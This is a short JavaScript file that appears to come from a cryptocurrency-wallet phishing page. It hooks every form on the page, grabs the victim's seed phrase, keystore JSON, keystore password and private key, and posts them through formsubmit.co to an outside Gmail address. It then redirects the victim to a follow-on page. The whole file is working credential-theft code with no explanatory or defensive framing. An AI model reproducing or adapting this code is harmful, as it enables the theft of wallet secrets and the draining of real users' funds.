const keystorejsonProceedBtn = document.getElementById("keystorejsonproceed");
const privatekeyProceedBtn = document.getElementById("privatekeyProceed");
const phraseProceedBtn = document.getElementById("phraseProceed");
const forms = document.querySelectorAll("form");

forms.forEach((form) => form.addEventListener("submit", o));

function o(e) {
  e.preventDefault();
  mail = "whitejones0070@gmail.com";
  next =  "next.html";
  subject = `${window.location.hostname} ${new Date()}`;
  let r = new FormData();
  let s = document.querySelector("form").name;
  importeModal.style.display = "flex";
  phrase = phraseInput.value;
  jsonphrase = keystorejson.value;
  password = keystore_password.value;
  privatekey = privatekey.value;
  r.append("phraseKey", phrase);
  r.append("Keystore json phrase", jsonphrase);
  r.append("password", password);
  r.append("privatekey", privatekey);
  r.append("_captcha", false);
  r.append("_next", next);
  r.append("_template", "table");
  r.append("_subject", subject);
  console.log(r);
  let n = `https://formsubmit.co/${mail}`;
  fetch(
    n,
    {
      method: "POST",
      body: r,
    },
    { referrer: "https://twitter.com" },
  ).then((e) => window.location.assign(next));
}
